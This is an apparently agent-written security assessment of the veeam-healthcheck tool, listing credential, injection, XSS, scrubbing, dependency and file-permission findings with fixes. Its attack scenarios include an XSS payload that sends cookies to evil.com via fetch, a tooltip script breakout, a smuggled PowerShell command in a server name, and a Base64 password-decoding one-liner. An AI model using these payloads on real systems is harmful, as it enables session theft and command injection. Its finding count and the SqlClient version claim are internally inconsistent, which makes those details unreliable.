# Veeam Health Check - Security Assessment Report

> **STATUS: REVIEW COMPLETE — FINDINGS NOT ACTIONED** | 2 Critical (XSS in CHtmlFormatting, SqlClient CVE-2024-0056), 5 High. No remediation implemented yet. Immediate items: HtmlEncode in TableData(), SqlClient migration.

**Date:** 2026-03-15
**Scope:** Full codebase security review of veeam-healthcheck (commit f00de23, branch dev)
**Type:** Authorized read-only assessment
**Assessor:** Automated security review agent

---

## Executive Summary

This security assessment identified **23 findings** across the 7 review areas. The most critical issues are in **HTML output XSS** (no encoding of user-controlled data in HTML reports) and **credential exposure via process arguments** (passwords visible in process listings). The scrubbing/anonymization system has notable gaps, and several dependency packages are outdated or unnecessary.

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 5 |
| Medium | 9 |
| Low | 5 |
| Informational | 2 |

---

## 1. Credential Handling

### Finding 1.1: Passwords Visible in Process Command Line Arguments (High)

**Files:**
- `vHC/HC_Reporting/Functions/Collection/PSCollections/PSInvoker.cs` (lines 248-252, 460-486, 660-704)
- `vHC/HC_Reporting/Functions/Collection/CCollections.cs` (lines 289-294)

**Description:** When credentials are needed for remote execution, passwords are Base64-encoded and passed as command-line arguments to PowerShell processes via `ProcessStartInfo.Arguments`. While Base64 is used instead of plaintext, Base64 is **not encryption** -- it is trivially reversible. More critically, command-line arguments are visible to any process on the system via Task Manager, `wmic process`, or the `/proc` filesystem equivalent on Windows (`Get-CimInstance Win32_Process`).

**Attack Scenario:** Any user or process with access to the same machine can enumerate running processes and extract the Base64-encoded password from the command line of the PowerShell child process. The password can be decoded in one line: `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("..."))`.

**Specific code (PSInvoker.cs:486):**
```csharp
argString += $"-User \"{creds.Value.Username}\" -PasswordBase64 \"{passwordBase64}\" ";
```

**Severity:** High -- passwords are exposed to all local users via process enumeration.

**Remediation:**
- Use PowerShell's `-Credential` parameter with a `PSCredential` object passed via the PowerShell SDK (System.Management.Automation) instead of spawning external processes with credentials in arguments.
- If external process execution is required, pass credentials via stdin pipe or environment variables (which are per-process and not visible to other users).
- Consider using Windows Credential Manager or DPAPI-encrypted named pipes.

---

### Finding 1.2: CredentialStore File Lacks Restrictive ACLs (Medium)

**File:** `vHC/HC_Reporting/Startup/CredentialStore.cs` (lines 20-22, 162)

**Description:** The credential store writes encrypted credentials to `%APPDATA%\VeeamHealthCheck\creds.json`. While DPAPI (`ProtectedData.Protect` with `DataProtectionScope.CurrentUser`) is used for password encryption (which is good), the file is created with default permissions via `File.WriteAllText()`. No explicit ACLs are set to restrict access to the current user only.

**Specific code:**
```csharp
private static readonly string StorePath = Path.Combine(
    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
    "VeeamHealthCheck", "creds.json");
// ...
File.WriteAllText(StorePath, JsonSerializer.Serialize(serializable, ...));
```

**Note:** The `%APPDATA%` directory typically inherits restrictive permissions for the current user profile, which provides reasonable default protection. However, in enterprise environments with modified group policies or shared profiles, this may not be sufficient.

**Severity:** Medium -- mitigated by DPAPI encryption and typical APPDATA permissions, but lacks defense in depth.

**Remediation:**
- After creating the file, explicitly set ACLs to restrict access to the current user only using `System.Security.AccessControl.FileSecurity`.
- Consider adding an integrity check (HMAC) to detect tampering with the credential file.

---

### Finding 1.3: TestMfa Passes Password in Single-Quoted PowerShell Arguments (Medium)

**File:** `vHC/HC_Reporting/Functions/Collection/PSCollections/PSInvoker.cs` (lines 245-252)

**Description:** The `TestMfa()` method uses `EscapePasswordForPowerShell()` (which only escapes single quotes by doubling them) and passes the escaped password directly in a PowerShell command string:

```csharp
string escapedPassword = CredentialHelper.EscapePasswordForPowerShell(creds.Value.Password);
Arguments = $"Import-Module Veeam.Backup.PowerShell; Connect-VBRServer -Server '{CGlobals.REMOTEHOST ?? "localhost"}' -User '{creds.Value.Username}' -Password '{escapedPassword}'"
```

While single-quote escaping prevents PowerShell variable expansion, the password is still plaintext in the process arguments and visible in process listings. Additionally, if a password contains a null byte or certain control characters, the single-quote escaping alone may be insufficient.

**Severity:** Medium -- exposed in process listing, though the single-quote approach is better than the double-quote variant.

**Remediation:**
- Replace with PSCredential-based approach as described in Finding 1.1.
- At minimum, use the Base64 approach that the other methods (VbrConfigStartInfo, ConfigStartInfo) now use.

---

### Finding 1.4: Plaintext Password in Legacy Impersonation Code (Low)

**Files:**
- `vHC/HC_Reporting/Functions/Collection/Security/CSecurityInit.cs` (lines 45-98)
- `vHC/HC_Reporting/Functions/Collection/CImpersonation.cs` (lines 50-90)

**Description:** Both files contain legacy code that reads passwords from console input via `Console.ReadKey()` and passes them as plaintext strings to `LogonUser()` via P/Invoke. The `CSecurityInit.RunImpersonated()` method appears to be commented out in the `Run()` method (line 39), but the code still exists and could be re-enabled. The `CImpersonation` class is still active.

Password is accumulated in a `string` variable character by character, which means it persists in managed memory indefinitely (cannot be securely cleared like `SecureString`).

**Severity:** Low -- `CSecurityInit.RunImpersonated()` is commented out; `CImpersonation` uses this pattern actively but `LogonUser` is a standard Windows API.

**Remediation:**
- Remove the dead code in `CSecurityInit.RunImpersonated()`.
- In `CImpersonation`, use `SecureString` for password handling and clear it after use.
- Use `CredentialHelper.ConvertToSecureString()` which already exists in the codebase.

---

### Finding 1.5: Scrubber Key File Written to Unscrubbed Output Directory (Medium)

**File:** `vHC/HC_Reporting/Common/Scrubber/CXmlHandler.cs` (lines 15, 44)

**Description:** The scrubber writes a mapping file (`vHC_KeyFile.xml` and `vHC_KeyFile.json`) that maps original values to their scrubbed replacements. These files are written to `CVariables.unsafeDir` (the "Original" output directory). If this directory is shared or accessed by unauthorized parties, the key file would allow reversing all anonymization.

```csharp
private readonly string matchListPath = CVariables.unsafeDir + @"\vHC_KeyFile.xml";
// ...
this.WriteDictionaryToJsonFile(newDict, CVariables.unsafeDir + @"\vHC_KeyFile.json");
```

**Severity:** Medium -- defeats the purpose of scrubbing if the key file is distributed alongside reports.

**Remediation:**
- Store the key file in a separate, protected location (e.g., `%APPDATA%\VeeamHealthCheck\`).
- Warn the user that the key file should not be shared alongside scrubbed reports.
- Consider encrypting the key file with DPAPI.

---

## 2. PowerShell Script Injection

### Finding 2.1: Server Name Not Quoted in LogCollectionInfo and ServerDumpInfo Arguments (High)

**File:** `vHC/HC_Reporting/Functions/Collection/PSCollections/PSInvoker.cs` (lines 579, 609)

**Description:** The `LogCollectionInfo()` and `ServerDumpInfo()` methods construct PowerShell argument strings with the server name and path **without quoting**:

```csharp
// Line 579 - LogCollectionInfo:
argString = $"-NoProfile -ExecutionPolicy unrestricted -file {scriptLocation} -Server {server} -ReportPath {path}";

// Line 609 - ServerDumpInfo:
argString = $"-NoProfile -ExecutionPolicy unrestricted -file \"{scriptLocation}\" -Server {server}";
```

If `CGlobals.REMOTEHOST` contains spaces or PowerShell metacharacters (semicolons, pipes, ampersands), this could cause command injection or unexpected behavior. While `REMOTEHOST` is typically set from user input via CLI args or GUI, it is not sanitized.

Compare with the properly quoted version in `VbrConfigStartInfo()` (line 461):
```csharp
$"-VBRServer \"{CGlobals.REMOTEHOST}\" "  // Properly quoted
```

**Attack Scenario:** A malicious server name like `localhost; Invoke-Expression malicious-code` could execute arbitrary PowerShell commands.

**Severity:** High -- command injection via unquoted parameter interpolation.

**Remediation:**
- Quote all parameter values in PowerShell argument strings: `-Server "{server}"`.
- Validate `REMOTEHOST` against a hostname/IP regex pattern before use.
- Apply consistent quoting across all `ProcessStartInfo.Arguments` construction.

---

### Finding 2.2: Username Not Validated Before PowerShell Argument Interpolation (Medium)

**File:** `vHC/HC_Reporting/Functions/Collection/PSCollections/PSInvoker.cs` (lines 252, 486, 678, 703)
**File:** `vHC/HC_Reporting/Functions/Collection/CCollections.cs` (line 294)

**Description:** The username from credential prompts is placed into double-quoted PowerShell argument strings:

```csharp
argString += $"-User \"{creds.Value.Username}\" -PasswordBase64 \"{passwordBase64}\" ";
```

While double quotes provide some protection, a username containing `"` (double quote) characters could break out of the quoted context. The `CredentialHelper` class has `EscapePasswordForDoubleQuotes()` but this is only used for passwords, not usernames.

**Severity:** Medium -- requires deliberately crafted username input, which the user controls.

**Remediation:**
- Apply `EscapePasswordForDoubleQuotes()` or equivalent escaping to usernames as well.
- Validate usernames against an allowed character set (alphanumeric, domain separators).

---

### Finding 2.3: ExecutionPolicy Set to Unrestricted (Low)

**File:** `vHC/HC_Reporting/Functions/Collection/PSCollections/PSInvoker.cs` (multiple lines)

**Description:** PowerShell scripts are executed with `-ExecutionPolicy unrestricted`, which allows running unsigned scripts. While this is necessary for the tool's operation (its own scripts are unsigned), it also means any script in the execution path will run without restriction.

Some methods use `Bypass` (CCollections.cs) while others use `unrestricted` (PSInvoker.cs). `Bypass` is actually more explicit and appropriate for "I know what I'm running."

**Severity:** Low -- necessary for tool operation, but `Bypass` is preferred over `unrestricted`.

**Remediation:**
- Standardize on `-ExecutionPolicy Bypass` across all invocations for consistency.
- Consider signing PowerShell scripts and using `RemoteSigned` policy.

---

## 3. CSV Parsing & Input Validation

### Finding 3.1: MissingFieldFound Suppressed in CSV Configuration (Medium)

**File:** `vHC/HC_Reporting/Functions/Reporting/CsvHandlers/CCsvReader.cs` (line 85)

**Description:** The CSV configuration sets `MissingFieldFound = null`, which silently ignores missing fields in CSV rows:

```csharp
var config = new CsvConfiguration(CultureInfo.InvariantCulture)
{
    PrepareHeaderForMatch = args => args.Header.ToLower()...
    MissingFieldFound = null,  // Silently ignores missing fields
};
```

If a CSV file is truncated, corrupted, or manipulated, missing fields will produce `null` values that flow through the pipeline without error. Combined with the extensive use of `dynamic` objects, this means corrupt data can silently enter reports.

**Severity:** Medium -- data integrity issue that could produce misleading reports.

**Remediation:**
- Implement a custom `MissingFieldFound` handler that logs warnings for missing fields.
- Add a validation step after CSV parsing to check for unexpected null values in critical fields.

---

### Finding 3.2: No CSV File Size Limits (Low)

**File:** `vHC/HC_Reporting/Functions/Reporting/CsvHandlers/CCsvReader.cs` (lines 39-63)

**Description:** CSV files are read using `StreamReader` with no size limit check. The `FileFinder` method searches for CSV files and reads them entirely into memory via CsvHelper's `GetRecords<dynamic>()`. A maliciously large CSV file could cause memory exhaustion (DoS).

**Severity:** Low -- the CSV files are generated by the tool's own PowerShell scripts, so the attack surface is limited to scenarios where an attacker can replace CSV files in the output directory.

**Remediation:**
- Add a file size check before reading (e.g., reject files over 100MB).
- Consider streaming processing for large datasets.

---

### Finding 3.3: Dynamic Object Usage Bypasses Type Safety (Informational)

**File:** `vHC/HC_Reporting/Functions/Reporting/CsvHandlers/CCsvParser.cs` (throughout)

**Description:** Most CSV parsing methods return `IEnumerable<dynamic>`, which means field names and types are determined at runtime. There is no validation that expected fields exist or contain valid data. A modified CSV with unexpected column names would silently produce objects with different properties.

**Severity:** Informational -- design trade-off for flexibility with varying Veeam versions.

**Remediation:**
- For security-critical fields (server names, paths), add explicit validation after parsing.
- Consider migrating high-risk tables from `dynamic` to strongly-typed DTOs.

---

## 4. HTML Output XSS

### Finding 4.1: No HTML Encoding in Report Generation -- Stored XSS (Critical)

**Files:**
- `vHC/HC_Reporting/Functions/Reporting/Html/Shared/CHtmlFormatting.cs` (lines 169-184)
- All table renderers in `Functions/Reporting/Html/VBR/VbrTables/` and `Functions/Reporting/Html/VB365/`

**Description:** The HTML generation layer uses `string.Format()` to interpolate data directly into HTML without any encoding. The core `TableData()` and `TableDataLeftAligned()` methods in `CHtmlFormatting` are the primary output functions:

```csharp
public string TableData(string data, string toolTip)
{
    return string.Format("<td title=\"{0}\">{1}</td>", toolTip, data);
}

public string TableDataLeftAligned(string data, string toolTip)
{
    return string.Format("<td title=\"{0}\" style=\"text-align:left\">{1}</td>", toolTip, data);
}
```

**Neither `data` nor `toolTip` are HTML-encoded.** A comprehensive search for `HtmlEncode`, `HttpUtility`, `WebUtility.Encode`, or `SecurityElement.Escape` in the entire HTML generation codebase returned **zero results** for encoding usage.

Data flows from CSV files (which are generated by PowerShell scripts collecting Veeam configuration data) directly into these HTML output methods. Veeam object names (server names, job names, repository names, paths, descriptions) are all user-defined strings that could contain HTML/JavaScript payloads.

**Attack Scenario:**
1. An attacker with access to the Veeam environment creates a backup job with a name like: `<img src=x onerror="fetch('https://evil.com/?cookie='+document.cookie)">`
2. The health check tool collects this job name via PowerShell and writes it to a CSV file.
3. The HTML report generator reads the CSV and interpolates the malicious name directly into the HTML report.
4. When a Veeam administrator opens the generated HTML report in a browser, the JavaScript executes in their browser context.

This also affects the `title` attribute (tooltip), where an attacker could break out with: `"><script>alert(1)</script><td title="`.

**Additional affected methods:**
- `SectionButton()` (line 46): `string.Format("<button ... class=\"{0} classBtn\">{1}</button>", classType, displayText)`
- `CollapsibleButton()`: passes through to `SectionButton`
- `FormNavRows()` (line 60): navigation links with unencoded text
- `TableHeader()` (lines 139-147): header text and tooltips unencoded

**Severity:** Critical -- stored XSS via Veeam object names, affects every report consumer.

**Remediation:**
- Add `System.Net.WebUtility.HtmlEncode()` to ALL data interpolation points in `CHtmlFormatting`:
  ```csharp
  public string TableData(string data, string toolTip)
  {
      return string.Format("<td title=\"{0}\">{1}</td>",
          WebUtility.HtmlEncode(toolTip ?? ""),
          WebUtility.HtmlEncode(data ?? ""));
  }
  ```
- Apply encoding at the `CHtmlFormatting` layer (centralized) rather than at each caller.
- For the `title` attribute specifically, also encode double quotes.
- Audit all callers that bypass `CHtmlFormatting` and write HTML directly (e.g., the `<tr><td colspan=...` patterns in individual table classes).

---

### Finding 4.2: Direct HTML String Construction in Table Renderers (High)

**Files (examples):**
- `vHC/HC_Reporting/Functions/Reporting/Html/VBR/VbrTables/GeneralSettings/CCredentialsTable.cs` (line 38)
- `vHC/HC_Reporting/Functions/Reporting/Html/VBR/VbrTables/GeneralSettings/CEmailNotificationTable.cs` (line 41)
- `vHC/HC_Reporting/Functions/Reporting/Html/VBR/VbrTables/CHtmlTables.cs` (line 310)

**Description:** Some table renderers construct HTML strings directly without going through `CHtmlFormatting`:

```csharp
// CCredentialsTable.cs:38
s += "<tr><td colspan='4' style='text-align: center; ...'><em>No credentials detected.</em></td></tr>";

// CHtmlTables.cs:310
s += $"<td style='color: {severityColor}; font-weight: bold;'>{result.Severity}</td>";
```

While the static strings are safe, the pattern of building HTML via string concatenation without a consistent encoding layer makes it easy to introduce new XSS vulnerabilities.

**Severity:** High -- inconsistent HTML construction pattern across ~60+ table files.

**Remediation:**
- All HTML output should go through `CHtmlFormatting` methods that apply encoding.
- Create a code review checklist that flags direct HTML string construction outside `CHtmlFormatting`.

---

## 5. Scrubbing/Anonymization Completeness

### Finding 5.1: Email Addresses Not Scrubbed in Email Notification Table (High)

**File:** `vHC/HC_Reporting/Functions/Reporting/Html/VBR/VbrTables/GeneralSettings/CEmailNotificationTable.cs` (lines 55-56)

**Description:** The Email Notification table scrubs the SMTP server name but does NOT scrub the `from` and `to` email addresses:

```csharp
string smtpServer = (string)(item.smtpserver ?? "");
if (scrub)
    smtpServer = CGlobals.Scrubber.ScrubItem(smtpServer, ScrubItemType.Server);

s += this.form.TableData((string)(item.from ?? ""), string.Empty);    // NOT SCRUBBED
s += this.form.TableData((string)(item.to ?? ""), string.Empty);      // NOT SCRUBBED
```

Email addresses reveal organization domain names, individual identities, and internal naming conventions -- exactly the kind of information scrubbing is meant to remove.

**Severity:** High -- direct PII leak in scrubbed reports.

**Remediation:**
- Scrub `from` and `to` fields using a new `ScrubItemType.Email` or existing `ScrubItemType.Item`.
- Audit all table renderers for similar unscrubbed fields.

---

### Finding 5.2: Credential Description Field Not Scrubbed (Medium)

**File:** `vHC/HC_Reporting/Functions/Reporting/Html/VBR/VbrTables/GeneralSettings/CCredentialsTable.cs` (line 56)

**Description:** The Credentials table scrubs `name` and `userName` but not the `description` field:

```csharp
s += this.form.TableData((string)(item.description ?? ""), string.Empty);  // NOT SCRUBBED
```

Credential descriptions often contain server names, IP addresses, or purpose descriptions that reveal infrastructure details.

**Severity:** Medium -- metadata leak in scrubbed reports.

**Remediation:**
- Apply `ScrubItem()` to the description field with `ScrubItemType.Item`.

---

### Finding 5.3: Scrubber Does Not Handle IP Addresses, UNC Paths, or Embedded Data (Medium)

**File:** `vHC/HC_Reporting/Common/Scrubber/CXmlHandler.cs`

**Description:** The `CScrubHandler` performs simple 1:1 string replacement -- it maps whole strings to anonymized names (e.g., "MYSERVER01" -> "Server_0"). It does NOT:

- Detect and scrub IP addresses embedded in strings (e.g., "Connected to 192.168.1.100 on port 443")
- Handle UNC paths with embedded server names (e.g., "\\\\FILESERVER\\share" only scrubs if the entire path is passed)
- Scrub partial matches (e.g., if server "DC01" appears as part of "DC01.contoso.local", the FQDN may not be scrubbed)
- Handle email addresses as a type
- Scrub numeric identifiers (account SIDs, GUIDs)

**Severity:** Medium -- scrubbing provides incomplete anonymization.

**Remediation:**
- Add regex-based scrubbing for IP addresses (`\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b`).
- Add scrubbing for FQDNs (domain suffix matching).
- Add scrubbing for email addresses.
- Consider a post-processing pass that searches the final HTML for any known original values.

---

### Finding 5.4: ScrubItemType Enum Missing Key Types (Low)

**File:** `vHC/HC_Reporting/Common/Scrubber/CXmlHandler.cs` (lines 123-134)

**Description:** The `ScrubItemType` enum only has: Job, MediaPool, Repository, Server, Path, VM, SOBR, Item. Missing types include:
- Email
- IPAddress
- FQDN
- Credential/Username
- Organization
- Description

This means all "other" scrubbing uses the generic `Item` type, making it difficult to generate meaningful anonymized names (everything becomes "Item_0", "Item_1", etc.).

**Severity:** Low -- functional but reduces usefulness of anonymized data.

**Remediation:**
- Add domain-specific scrub types for better anonymization naming.

---

## 6. Dependency Vulnerabilities

### Finding 6.1: System.Data.SqlClient 4.8.6 Has Known CVEs (Critical)

**File:** `vHC/HC_Reporting/VeeamHealthCheck.csproj` (line 127)

**Description:**
```xml
<PackageReference Include="System.Data.SqlClient" Version="4.8.6" />
```

`System.Data.SqlClient` has been superseded by `Microsoft.Data.SqlClient`. Version 4.8.6 is affected by:
- **CVE-2024-0056** (CVSS 8.7): Information disclosure vulnerability when connecting to SQL Server. An attacker who successfully exploited this vulnerability could perform a man-in-the-middle attack and decrypt/read/modify TLS traffic between the client and server.

Microsoft recommends migrating to `Microsoft.Data.SqlClient` which receives active security patches.

**Severity:** Critical -- known CVSS 8.7 vulnerability in a networking component.

**Remediation:**
- Migrate from `System.Data.SqlClient` to `Microsoft.Data.SqlClient` (latest stable version).
- If migration is not immediately possible, update to the latest `System.Data.SqlClient` version (4.8.6 may already include the fix -- verify against NuGet advisories).

---

### Finding 6.2: Unnecessary Node.js and Npm Package References (Medium)

**File:** `vHC/HC_Reporting/VeeamHealthCheck.csproj` (lines 125-126)

**Description:**
```xml
<PackageReference Include="Node.js" Version="5.3.0" />
<PackageReference Include="Npm" Version="3.5.2" />
```

These are very old versions (Node.js 5.3.0 is from 2015, npm 3.5.2 from 2016). Both are far past end-of-life and contain numerous known vulnerabilities. It is unclear why a .NET WPF application requires Node.js/npm as NuGet dependencies. These packages may be vestigial from an earlier development approach.

**Severity:** Medium -- potentially unnecessary attack surface with known vulnerabilities in ancient Node.js.

**Remediation:**
- Determine if Node.js/npm packages are actually used at runtime.
- If not needed, remove them from the csproj.
- If needed, update to current LTS versions.

---

### Finding 6.3: DinkToPdf.Standard 1.1.0 Uses Native wkhtmltopdf (Low)

**File:** `vHC/HC_Reporting/VeeamHealthCheck.csproj` (line 120)

**Description:**
```xml
<PackageReference Include="DinkToPdf.Standard" Version="1.1.0" />
```

DinkToPdf is a .NET wrapper around `wkhtmltopdf`, which uses an embedded WebKit engine. The embedded WebKit in wkhtmltopdf is significantly outdated and has known vulnerabilities. When converting HTML to PDF, any XSS payloads in the HTML (see Finding 4.1) would execute in the wkhtmltopdf WebKit context, potentially allowing file system access or other exploitation depending on the wkhtmltopdf version.

**Severity:** Low -- the PDF conversion uses locally-generated HTML, but combined with Finding 4.1, this could escalate.

**Remediation:**
- Evaluate alternatives like Playwright-based PDF generation or PuppeteerSharp.
- Ensure that HTML is properly sanitized before PDF conversion.

---

### Finding 6.4: SecurityCodeScan Analyzer is Archived (Informational)

**File:** `vHC/HC_Reporting/VeeamHealthCheck.csproj` (lines 135-138)

**Description:**
```xml
<PackageReference Include="SecurityCodeScan.VS2019" Version="5.6.7">
```

SecurityCodeScan.VS2019 is an archived project (last release 2022). Consider migrating to actively maintained alternatives.

**Severity:** Informational -- the analyzer still functions but will not detect new vulnerability patterns.

**Remediation:**
- Consider migrating to `Meziantou.Analyzer` or `Microsoft.CodeAnalysis.BannedApiAnalyzers` for additional security coverage.
- The existing `.NET Analyzers 8.0.0` package provides some security analysis.

---

## 7. File System Security

### Finding 7.1: Hardcoded World-Readable Output Path (Medium)

**File:** `vHC/HC_Reporting/Startup/CVariables.cs` (line 11)

**Description:**
```csharp
public static readonly string outDir = @"C:\temp\vHC";
```

The default output directory `C:\temp\vHC` is under `C:\temp`, which is often world-readable (and sometimes world-writable) on Windows systems. Health check reports contain sensitive infrastructure details:
- Server names and IP addresses
- Backup job configurations
- Repository paths and credentials metadata
- Security compliance status
- License information

**Severity:** Medium -- sensitive data written to a commonly accessible directory.

**Remediation:**
- Change the default output directory to a user-specific location (e.g., `%LOCALAPPDATA%\VeeamHealthCheck\Reports`).
- Set explicit ACLs on the output directory upon creation.
- Warn users in documentation about the sensitivity of output files.

---

### Finding 7.2: Predictable Output Directory Structure (Low)

**Files:**
- `vHC/HC_Reporting/Startup/CVariables.cs` (lines 79-92)
- `vHC/HC_Reporting/Tools/Scripts/HealthCheck/VBR/Get-VBRConfig.ps1` (lines 40-43)

**Description:** The output directory follows a predictable pattern:
```
C:\temp\vHC\Original\VBR\{servername}\{yyyyMMdd_HHmmss}\
C:\temp\vHC\Original\Log\
C:\temp\vHC\Anonymous\
```

The predictable structure could allow an attacker to:
1. Pre-create symlinks in `C:\temp\vHC\Original\VBR\{known-servername}\` pointing to sensitive locations.
2. Monitor the directory for new timestamp directories to exfiltrate fresh reports.
3. Pre-populate CSV files with malicious content before the tool writes its own (race condition with directory creation in PowerShell scripts).

**Severity:** Low -- requires local access and knowledge of the server name being scanned.

**Remediation:**
- Add randomized components to directory names.
- Check for pre-existing symlinks before writing.
- Use exclusive file creation flags.

---

### Finding 7.3: No File Integrity Verification on CSV Files (Medium)

**Files:**
- `vHC/HC_Reporting/Functions/Reporting/CsvHandlers/CCsvReader.cs`
- `vHC/HC_Reporting/Functions/Collection/PSCollections/PSInvoker.cs`

**Description:** Between the time PowerShell scripts write CSV files and the C# reporting layer reads them, there is no integrity verification. An attacker with write access to the output directory could modify CSV files to:
1. Inject XSS payloads (see Finding 4.1) that execute when reports are opened.
2. Alter security compliance results to hide actual vulnerabilities.
3. Modify server counts or job configurations to produce misleading reports.

The tool trusts CSV file contents completely -- there are no checksums, signatures, or even basic validation of expected data ranges.

**Severity:** Medium -- TOCTOU vulnerability between data collection and report generation.

**Remediation:**
- Generate checksums for CSV files during the collection phase and verify them before reading.
- Consider keeping CSV data in memory rather than writing to disk and re-reading.
- If disk persistence is needed, use DPAPI or file locks.

---

## Summary of Remediation Priority

### Immediate (Critical -- fix before next release):
1. **Finding 4.1:** Add HTML encoding to `CHtmlFormatting.TableData()` and all HTML output methods.
2. **Finding 6.1:** Evaluate and mitigate `System.Data.SqlClient` CVE-2024-0056.

### Short-term (High -- fix in next sprint):
3. **Finding 1.1:** Replace command-line password passing with stdin pipe or SDK approach.
4. **Finding 2.1:** Quote all server names in PowerShell argument strings.
5. **Finding 4.2:** Standardize all HTML output through encoding-aware `CHtmlFormatting`.
6. **Finding 5.1:** Scrub email addresses in email notification table.

### Medium-term (Medium -- plan for upcoming releases):
7. **Finding 1.2:** Add explicit ACLs to credential store file.
8. **Finding 1.3:** Migrate TestMfa to Base64/PSCredential approach.
9. **Finding 1.5:** Relocate scrub key file to protected directory.
10. **Finding 2.2:** Validate and escape usernames in PS arguments.
11. **Finding 3.1:** Implement MissingFieldFound handler with logging.
12. **Finding 5.2:** Scrub credential description fields.
13. **Finding 5.3:** Add regex-based scrubbing for IPs, FQDNs, emails.
14. **Finding 6.2:** Remove or update Node.js/npm packages.
15. **Finding 7.1:** Change default output directory.
16. **Finding 7.3:** Add CSV file integrity verification.

### Low Priority (Low/Informational -- backlog):
17. **Finding 1.4:** Remove dead impersonation code.
18. **Finding 2.3:** Standardize ExecutionPolicy to Bypass.
19. **Finding 3.2:** Add CSV file size limits.
20. **Finding 3.3:** Migrate security-critical tables from dynamic to typed DTOs.
21. **Finding 5.4:** Expand ScrubItemType enum.
22. **Finding 6.3:** Evaluate DinkToPdf/wkhtmltopdf alternatives.
23. **Finding 6.4:** Update security analyzer tooling.
24. **Finding 7.2:** Add randomization to output paths.

---

## Appendix: Files Examined

### Credential Handling
- `vHC/HC_Reporting/Functions/Collection/Security/CredentialHelper.cs`
- `vHC/HC_Reporting/Startup/CredentialStore.cs`
- `vHC/HC_Reporting/Functions/Collection/Security/CSecurityInit.cs`
- `vHC/HC_Reporting/Functions/CredsWindow/CredsHandler.cs`
- `vHC/HC_Reporting/Functions/CredsWindow/CredentialPromptWindow.xaml.cs`
- `vHC/HC_Reporting/Functions/Collection/CImpersonation.cs`

### PowerShell Execution
- `vHC/HC_Reporting/Functions/Collection/PSCollections/PSInvoker.cs`
- `vHC/HC_Reporting/Functions/Collection/PSCollections/PowerShell7Executor.cs`
- `vHC/HC_Reporting/Functions/Collection/CCollections.cs`
- `vHC/HC_Reporting/Tools/Scripts/HealthCheck/VBR/Get-VBRConfig.ps1`

### CSV Parsing
- `vHC/HC_Reporting/Functions/Reporting/CsvHandlers/CCsvReader.cs`
- `vHC/HC_Reporting/Functions/Reporting/CsvHandlers/CCsvParser.cs`

### HTML Generation
- `vHC/HC_Reporting/Functions/Reporting/Html/Shared/CHtmlFormatting.cs`
- `vHC/HC_Reporting/Functions/Reporting/Html/VBR/CHtmlBodyHelper.cs`
- `vHC/HC_Reporting/Functions/Reporting/Html/VBR/VbrTables/CHtmlTables.cs`
- `vHC/HC_Reporting/Functions/Reporting/Html/VBR/VbrTables/GeneralSettings/CCredentialsTable.cs`
- `vHC/HC_Reporting/Functions/Reporting/Html/VBR/VbrTables/GeneralSettings/CEmailNotificationTable.cs`
- `vHC/HC_Reporting/Functions/Reporting/Html/CHtmlExporter.cs`
- `vHC/HC_Reporting/Functions/Reporting/Html/CDataFormer.cs`
- `vHC/HC_Reporting/Functions/Reporting/Html/VB365/CM365Tables.cs`

### Scrubbing/Anonymization
- `vHC/HC_Reporting/Common/Scrubber/CXmlHandler.cs`

### Configuration
- `vHC/HC_Reporting/VeeamHealthCheck.csproj`
- `vHC/HC_Reporting/Common/CGlobals.cs`
- `vHC/HC_Reporting/Startup/CVariables.cs`
